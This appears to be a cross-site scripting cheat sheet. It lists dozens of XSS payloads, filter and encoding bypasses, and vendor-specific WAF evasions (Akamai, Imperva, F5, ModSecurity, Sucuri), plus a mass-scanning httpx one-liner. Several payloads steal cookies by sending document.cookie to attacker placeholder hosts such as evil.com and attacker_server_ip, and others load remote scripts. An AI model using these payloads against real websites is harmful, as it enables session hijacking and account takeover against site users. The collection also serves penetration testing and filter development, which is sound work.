	Check this AwesomeXSS github": - https://github.com/s0md3v/AwesomeXSS
	=====================================================================
	---------------
	| XXS Payload | Cross-Site Scripting (XSS) Cheatsheet
	---------------------------------------------------------------------


1-      '"></title></script><img src=x onerror=confirm(1)>

2-	<xml:namespace prefix="t">
	<svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>

3-	"><svg/onload=alert(document.domain)>"

4-	“><img src=x onerror=prompt(0);>

5- 	<marquee loop=1 width=0 onfinish=co\u006efirm(document.cookie)>XSS</marquee>

6- 	${7*7}{{7*7}}"--></script><img/src=x onerror=';alert(0);'>

7- 	<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
	<d3"<"/onclick="1>[confirm``]"<">z
	<d3/onmouseenter=[2].find(confirm)>z
	<details open ontoggle=confirm()>
	<script y="><">/*<script* */prompt()</script
	<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
	<a href="javascript%26colon;alert(1)">click
	<a href=javas&#99;ript:alert(1)>click
	<script/"<a"/src=data:=".<a,[8].some(confirm)>
	<svg/x=">"/onload=confirm()//
	<--`<img/src=` onerror=confirm``> --!>
	<svg%0Aonload=%09((pro\u006dpt))()//
	<sCript x>(((confirm)))``</scRipt x>
	<svg </onload ="1> (_=prompt,_(1)) "">
	<!--><script src=//14.rs>
	<embed src=//14.rs>
	<script x=">" src=//15.rs></script>
	<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
	<iframe/src \/\/onload = prompt(1)
	<x oncut=alert()>x
	<svg onload=write()>
	"><script>alert(0);</script>
	""></script/><script/>(confirm)(1)

8- 	%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`


9- 	<svg onload=alert(0)>

10- 	'"()&%<acx><ScRiPt >alert(/openbugbounty/)</ScRiPt>

11- 	<style>
	@keyframes
 	a{}b{animation:a;}</style>
	<b/onanimationstart=prompt`${document.domain}&#x60;>
	<d3v/onauxclick=[2].some(confirm)>click
	<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>


12- 	"--!><Svg/OnLoad=(confirm)(1)>"


13- 	<<meh<meh>svg/onload=alert(1)>

14- 	<details ontoggle=prompt()>

15- 	script ~~~>alert(0%0)</script ~~~>
	<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
	<svg><style>'<body/onload=confirm(1)>'
	<iframe/%00/ src=javaSCRIPT&colon;alert(/hhhh/)
	//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
	
	
16- 	"onmouseover="confirm/()"//
		If your payload in string tag like : value="alexa" 
			you can simple alert by onmouseover - payload to alert xss
			"onmouseover="alert(1)

17- 	<a href=“JavaScript:alert(1)”>test</a>	
	
18-	cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
	
	
19- 	A nice one from @garethheyes
	eval([,]+'ale'+[,]+[,]+'rt(1)'+[,])
	
20- 	" onload="alert(1)
21- 	<xml onreadystatechange=alert(1)>

22- 	<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>



	--------------------------------------------------------------------
	XSS Locators:
	'';!--"<XSS>=&{()}
	--------------------------------------------------------------------
	Classic Payloads:
	<svg onload=alert(1)>
	"><svg onload=alert(1)>
	<iframe src="javascript:alert(1)">
	"><script src=data:&comma;alert(1)//
	--------------------------------------------------------------------
	script tag filter bypass:
	<svg/onload=alert(1)>
	<script>alert(1)</script>
	<script     >alert(1)</script>
	<ScRipT>alert(1)</sCriPt>
	<%00script>alert(1)</script>
	<script>al%00ert(1)</script>
	<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
	
	--------------------------------------------------------------------
	HTML tags:
	<img/src=x a='' onerror=alert(1)>
	<IMG """><SCRIPT>alert(1)</SCRIPT>">
	<img src=`x`onerror=alert(1)>
	<img src='/' onerror='alert("xss")'>
	<IMG SRC=# onmouseover="alert('xxs')">
	<IMG SRC= onmouseover="alert('xxs')">
	<IMG onmouseover="alert('xxs')">
	<BODY ONLOAD=alert('XSS')>
	<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
	<SCRIPT SRC=http:/evil.com/xss.js?< B >
	"><XSS<test accesskey=x onclick=alert(1)//test
	<svg><discard onbegin=alert(1)>
	<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
	<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
	
	--------------------------------------------------------------------
	Other tags:
	<BASE HREF="javascript:alert('XSS');//">
	<DIV STYLE="width: expression(alert('XSS'));">
	<TABLE BACKGROUND="javascript:alert('XSS')">
	<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
	<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
	<xss id=x tabindex=1 onactivate=alert(1)></xss>
	<xss onclick="alert(1)">test</xss>
	<xss onmousedown="alert(1)">test</xss>
	<body onresize=alert(1)>”onload=this.style.width=‘100px’>
	<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
	
	--------------------------------------------------------------------
	CharCode:
	<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
	--------------------------------------------------------------------
	if the input is already in script tag:
	@domain.com">user+'-alert`1`-'@domain.com
	--------------------------------------------------------------------
	AngularJS: 

	toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
	
	--------------------------------------------------------------------
	Scriptless:
	<link rel=icon href="//evil?
	<iframe src="//evil?
	<iframe src="//evil?
	<input type=hidden type=image src="//evil?
	
	--------------------------------------------------------------------
	Unclosed Tags:
	<svg onload=alert(1)//
	--------------------------------------------------------------------
	DOM XSS:
	""><svg onload=alert(1)>
	<img src=1 onerror=alert(1)>
	javascript:alert(document.cookie)
	\"-alert(1)}//
	<><img src=1 onerror=alert(1)>

	--------------------------------------------------------------------
	Another case:
	param=abc`;return+false});});alert`xss`;</script>
	abc`; Finish the string
	return+false}); Finish the jQuery click function
	}); Finish the jQuery ready function
	alert`xss`; Here we can execute our code
	</script> This closes the script tag to prevent JavaScript parsing errors
	
	

=======================================================
``` 				Restriction Bypass						
=======================================================

	--------------------------------------------------------------------
	No parentheses:
	<script>onerror=alert;throw 1</script>
	<script>throw onerror=eval,'=alert\x281\x29'</script>
	<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
	<script>location='javascript:alert\x281\x29'</script>
	<script>alert`1`</script>
	<script>new Function`X${document.location.hash.substr`1`}`</script>
	--------------------------------------------------------------------

	No parentheses and no semicolons:
	<script>{onerror=alert}throw 1</script>
	<script>throw onerror=alert,1</script>
	<script>onerror=alert;throw 1337</script>
	<script>{onerror=alert}throw 1337</script>
	<script>throw onerror=alert,'some string',123,'haha'</script>
	--------------------------------------------------------------------
	No parentheses and no spaces:
	<script>Function`X${document.location.hash.substr`1`}```</script>
	--------------------------------------------------------------------
	Angle brackets HTML encoded (in an attribute):
	"onmouseover="alert(1)
	'-alert(1)-'   
	--------------------------------------------------------------------
	If quote is escaped:
	'}alert(1);{'
	‘}alert(1)%0A{‘
	\’}alert(1);{//
	--------------------------------------------------------------------
	Embedded tab, newline, carriage return to break up XSS:
	<IMG SRC="jav&#x09;ascript:alert('XSS');">
	<IMG SRC="jav&#x0A;ascript:alert('XSS');">
	<IMG SRC="jav&#x0D;ascript:alert('XSS');">
	--------------------------------------------------------------------
	Other:
	<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
	');alert("XSS");//

==============================================
Encoding									  |
==============================================
	--------------------------------------------------------------------
	Unicode:
	<script>\u0061lert(1)</script>
	<script>\u{61}lert(1)</script>
	<script>\u{0000000061}lert(1)</script>
	--------------------------------------------------------------------
	Hex:
	<script>eval('\x61lert(1)')</script>
	--------------------------------------------------------------------
	HTML:
	<svg><script>&#97;lert(1)</script></svg>
	<svg><script>&#x61;lert(1)</script></svg>
	<svg><script>alert&NewLine;(1)</script></svg>
	<svg><script>x="&quot;,alert(1)//";</script></svg>
	\’-alert(1)//
	--------------------------------------------------------------------
	URL:
	<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
	--------------------------------------------------------------------
	Double URL Encode:
	%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
	%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
	--------------------------------------------------------------------
	Unicode + HTML:
	<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&	#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
	--------------------------------------------------------------------
	HTML + URL:
	<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
	--------------------------------------------------------------------	

================================================
						WAF
================================================
	Akamai:
	---------
	1- ?returnurl=javascript:cyber=console;cyber.guy=cyber.log;momen=document;momen.cg=momen.cookie;

	2- Reflected XSS Akami Waf Bypass in Redirect Parameter using HTTP Parameter Pollution and Double Url Encode:
	/login?
	ReturnUrl=javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529
	
	3- Found CSTI in Agnular 1.6+ behind Akami WAF.  Here is the bypass to get document.domain:

		{{constructor.constructor('a=document;confirm(a.domain)')()}

	4- Akamai WAF bypass XSS in HTML-context when no character-filtering exists to trick it: 

		<style>@AbdulR020{}b{animation:a;}</style>
		<b/onanimationstart=prompt`${document.domain}&#x60;>

	5- <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
		<d3v/onauxclick=[2].some(confirm)>click

	6- Reflected #XSS Akami WAF Bypass in Redirect Parameter using #HTTP Parameter Pollution and Double #URL Encode:

		/login? 
		ReturnUrl=javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529


	Imperva Incapsula:
	%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
	<img/src="x"/onerror="[JS-F**K Payload]">
	<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
	<img src="/><script>alert('XSS by Vickie');</script>"/>
	<img src="123" onerror="alert('XSS by Vickie');"/>
	<a href="javascript:alert('XSS by Vickie')>Click me!</a>"

	--------------------------------------------------------------------
	WebKnight:
	<details ontoggle=alert(1)>
	<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
	--------------------------------------------------------------------
	F5 Big IP:
	<body style="height:1000px" onwheel="[DATA]">
	<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
	<body style="height:1000px" onwheel="[JS-F**k Payload]">
	<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
	<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
	<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
	--------------------------------------------------------------------Barracuda WAF:
	<body style="height:1000px" onwheel="alert(1)">
	<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
	--------------------------------------------------------------------
	PHP-IDS:
	<svg+onload=+"[DATA]"
	<svg+onload=+"aler%25%37%34(1)"
	--------------------------------------------------------------------
	Mod-Security:
	<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
	1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
	<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
	--------------------------------------------------------------------
	Quick Defense:
	<input type="search" onsearch="aler\u0074(1)">
	<details ontoggle="aler\u0074(1)">
	--------------------------------------------------------------------
	Sucuri WAF:
	1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
	1'%22()%26%25<acx><ScRiPt%20>alert(1)</ScRiPt>
	--------------------------------------------------------------------	

	https://example.com/account/{Here_you_inject_payload}/singup/
	(F(%22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22))

	- <![endif]-- onerror="<![endif]-->" onload="<img src=x onerror='alert(1)'/>">
	



